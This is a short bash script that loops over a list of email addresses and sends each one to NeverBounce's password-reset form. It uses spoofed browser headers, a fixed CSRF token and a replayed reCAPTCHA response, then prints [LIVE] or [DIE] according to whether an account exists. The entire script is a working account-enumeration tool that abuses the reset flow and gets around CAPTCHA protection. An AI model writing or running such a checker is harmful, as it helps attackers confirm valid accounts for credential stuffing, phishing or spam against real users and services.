for mail in $(cat $1); do
if [[ $(curl -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" -H "Accept-Language: id,en-US;q=0.7,en;q=0.3" -H "Accept-Encoding: gzip, deflate" -H "Referer: https://app.neverbounce.com/password/forgot" -H "Connection: close" -H "Content-Type: application/x-www-form-urlencoded" --data-binary "_token=r33wiZWd4qbpeJkuOyhANGYBkscRT5EugM8qEnsY&email=$mail&g-recaptcha-response=%20%2003AOLTBLRzYxOXtXwMZYOEQQnl_ol0pJ532foNajz67TANTO4bDDz-TtevtnstFOxucRlLPRtKWasrPOGNSlpE7TCdfcjSIp6cRaFWlpd0nvVVys2FcqdWl2sAi_kczKyooa2N6GiIZg3ZIAnx8yClyxXHawkl1N83zTsnQbJVsZcCT-upy4xf7OVByC8Td4BxuYg8UYdxCfDgobpRDWja4S8O0Cm4cwhOO42uSrGFi6JUMUG-WtL1IZ7hUr4P1o88scMLtHIfRuJroJNc4paiv7VjNQBo1XWkL_ZTp6_8QNBVgdz72ArFzb3NpznFys-Wt8UBMILprFLTN45LNe8vXaJD0ydBUx-0cg" https://app.neverbounce.com/password/forgot -L -s -D - --compressed --cookie-jar cok.txt --cookie cok.txt | grep -o 'Unable to find account') =~ 'Unable to find account' ]];
then
echo "[DIE] $mail"
else
echo "[LIVE] $mail"
fi
done